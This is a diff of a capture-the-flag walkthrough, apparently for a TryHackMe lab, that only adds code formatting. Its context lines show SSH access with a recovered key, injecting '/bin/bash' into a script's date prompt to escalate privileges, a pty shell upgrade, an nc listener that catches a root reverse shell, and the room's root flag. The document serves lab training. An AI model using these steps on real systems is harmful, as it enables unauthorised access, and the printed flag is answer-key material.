@@ -250,7 +250,7 @@ CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
 
 ```
 
-I create an id_rsa key on my machine, change the file permission (chmod 600 id_rsa) and connect to the machine via ssh:
+I create an id_rsa key on my machine, change the file permission (`chmod 600 id_rsa`) and connect to the machine via ssh:
 
 ```
 ssh -i id_rsa dale@10.10.229.165
@@ -290,7 +290,7 @@ cp /var/stats/stats.txt /var/stats/stats-$date_save.bak
 printf "Stats have been backed up\n"
 ```
 
-I enter /bin/bash when prompted for the date and I am now gyles.
+I enter `/bin/bash` when prompted for the date and I am now gyles.
 
 I stabilize the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
 
@@ -317,5 +317,3 @@ And set up a listener on my machine `nc -lnvp 1337`.
 After a couple of seconds, I get a shell as root on my machine.
 
 I can now see the content of the /root/root.txt file: **THM{fhqbznavfonq}**.
-
-
